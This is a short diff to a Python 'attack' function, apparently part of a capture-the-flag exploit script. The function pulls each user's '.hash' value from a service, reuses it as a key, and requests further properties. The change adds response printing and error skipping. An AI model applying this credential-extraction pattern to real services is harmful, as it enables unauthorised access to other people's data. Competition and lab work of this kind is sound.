@@ -79,7 +79,11 @@ async def attack(host: str, port: int) -> typing.List[bytes]:
         for data in attack_data:
             await ch.sendline(f'GET')
             await ch.sendline(f'{data.username} .hash')
-            await ch.recvline()
+            response = await ch.recvline()
+            print(response)
+
+            if response.startswith('ERROR'):
+                continue
 
             password_hash = await ch.recvline()
             key = bytes.fromhex(password_hash)
@@ -87,6 +91,7 @@ async def attack(host: str, port: int) -> typing.List[bytes]:
             await ch.sendline(f'GET')
             await ch.sendline(f'{data.username} {property_name}')
             response = await ch.recvline()
+            print(response)
 
             if response.startswith(f'ERROR'):
                 continue
